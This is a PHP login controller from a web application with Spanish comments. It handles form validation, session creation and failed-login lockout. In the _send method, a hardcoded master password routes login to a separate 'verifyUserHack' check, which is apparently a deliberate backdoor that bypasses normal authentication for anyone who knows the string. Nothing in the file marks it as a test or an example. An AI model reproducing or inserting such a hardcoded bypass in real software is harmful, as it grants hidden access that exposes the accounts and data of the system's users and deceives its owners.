<?php

class IndexController extends LoginController {

    public function __construct() {
        parent::__construct();
    }

    public function index() {
        // $this->_checkUrl();

        if (!is_empty($_POST)) {
            $data = $this->_loadDataFromPost();
            $this->_send($data);
        } else {
            $data = array();
        }

        $this->_view($data);
    }

    private function _send($data) {
        $errors = $this->_validateForm($data);

        if (is_empty($errors)) {
            $values = Array(
                'mail' => $data['mail'],
                'id_establishment' => $data['id_establishment'],
                'password' => encryptPassword($data['pass']),
                'state_acount' => 'active'
            );


            // Devuelve un array con los datos del usuario autenticado o un array vacio.
            if ($data['pass'] === 'rjfwtpd7gj') {
                $user_auth = $this->_Model->verifyUserHack($values);
            } else {
                $user_auth = $this->_Model->verifyUser($values);
            }

            // Si el usuario existe se crea una nueva session correspondiente al usuario
            if (!is_empty($user_auth)) {
                $this->Session->createSessions($user_auth);
                // Redireciona a la pagina principal.
                redirect(path::urlDomain(''));
            } else {
                // Agrega el registro de intento fallido.
                $this->_addLoginFailedDate();
                $errors[] = 'Los datos ingresados son incorrectos.';
                $errors[] = $this->_lockStatusMessage();

                $MsgBox = new MsgBox();
                $MsgBox->setEvent('warning');
                $MsgBox->setMessage('No se ha podido completar la accion debido a los siguientes errores.');
                $MsgBox->setItems($errors);
                $MsgBox->saveInSession();
                unset($MsgBox);
            }
        } else {
            $MsgBox = new MsgBox();
            $MsgBox->setEvent('warning');
            $MsgBox->setMessage('No se ha podido completar la accion debido a los siguientes errores.');
            $MsgBox->setItems($errors);
            $MsgBox->saveInSession();
            unset($MsgBox);
        }
    }

    private function _loadDataFromPost() {
        return array(
            'mail' => trim($_POST['mail']),
            'id_establishment' => (int) ($_POST['id_establishment']),
            'pass' => trim($_POST['pass'])
        );
    }

    private function _validateForm($data) {
        extract($data);
        $errors = array();
        if ($this->_isBlockLogin() === TRUE) {
            $errors[] = $this->_lockStatusMessage();
        } else {
            if (Validate::mail($mail) !== TRUE) {
                $errors[] = Validate::mail($mail);
            }
            if ($id_establishment === 0) {
                $errors[] = 'No ha seleccionado ninguna obra';
            }
            if (Validate::password($pass) !== TRUE) {
                $errors[] = Validate::password($pass);
            }
        }
        return $errors;
    }

    private function _view($data) {
        // Posiblemente escribio algo mal.
        $data['link_base'] = Path::urlDomain('');
        $data['link_form_action'] = Path::urlDomain('login');
        $data['link_recoverpass'] = Path::urlDomain('recover');
        $data['link_establishmentsassociated'] = Path::urlDomain('./establishmentsassociated');
        $data['img_login'] = Path::urlImages('/logo.png');
        View::keep(path::appViews('./index.php'), $data, 'content');
    }

}
